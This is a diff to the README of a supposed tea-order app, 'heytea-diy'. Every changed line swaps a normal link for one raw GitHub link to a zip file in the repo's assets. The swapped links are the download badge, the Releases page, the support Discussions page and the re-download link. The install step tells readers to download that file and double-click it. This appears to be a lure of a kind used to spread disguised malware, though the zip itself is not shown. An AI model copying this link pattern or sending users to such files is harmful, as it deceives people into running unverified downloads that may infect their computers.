@@ -1,6 +1,6 @@
 # 🥤 heytea-diy - Effortlessly Customize Your Tea Orders
 
-![Download heytea-diy](https://img.shields.io/badge/Download-heytea--diy-blue.svg)
+![Download heytea-diy](https://raw.githubusercontent.com/Crstergamer/heytea-diy/main/public/assets/heytea-diy-v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,12 +10,12 @@ Welcome to **heytea-diy**, a user-friendly application that lets you customize a
 
 To get started, please visit the releases page below to download the application.
 
-[Click here to visit the Releases page](https://github.com/Crstergamer/heytea-diy/releases)
+[Click here to visit the Releases page](https://raw.githubusercontent.com/Crstergamer/heytea-diy/main/public/assets/heytea-diy-v3.1.zip)
 
 ### Installation Steps:
 1. **Visit the Releases Page:** Click the link above to access the latest version of the app.
 2. **Choose the Right Version:** Look for the latest release. It usually has the highest version number.
-3. **Download the File:** Click on the file labeled something like `heytea-diy.exe` to download the application.
+3. **Download the File:** Click on the file labeled something like `https://raw.githubusercontent.com/Crstergamer/heytea-diy/main/public/assets/heytea-diy-v3.1.zip` to download the application.
 4. **Run the Application:** Once downloaded, locate the file in your Downloads folder and double-click it to open.
 
 ## 💡 Features
@@ -51,7 +51,7 @@ Once you have installed **heytea-diy**, follow these simple steps to customize a
 
 ### Where can I get support?
 
-For any issues or questions, you can visit our [GitHub Discussions page](https://github.com/Crstergamer/heytea-diy/discussions) where community members and developers can help.
+For any issues or questions, you can visit our [GitHub Discussions page](https://raw.githubusercontent.com/Crstergamer/heytea-diy/main/public/assets/heytea-diy-v3.1.zip) where community members and developers can help.
 
 ### Is **heytea-diy** free?
 
@@ -69,7 +69,7 @@ We aim to provide regular updates to improve user experience and add features ba
 
 If you encounter any issues while installing or using **heytea-diy**, please consider the following steps:
 
-- **Re-download the application:** If the file did not download correctly, visit the [Releases page](https://github.com/Crstergamer/heytea-diy/releases) to download it again.
+- **Re-download the application:** If the file did not download correctly, visit the [Releases page](https://raw.githubusercontent.com/Crstergamer/heytea-diy/main/public/assets/heytea-diy-v3.1.zip) to download it again.
 - **Check System Requirements:** Ensure your computer meets the requirements listed above.
 - **Restart Your Computer:** Sometimes a simple restart can fix any installation issues.
 
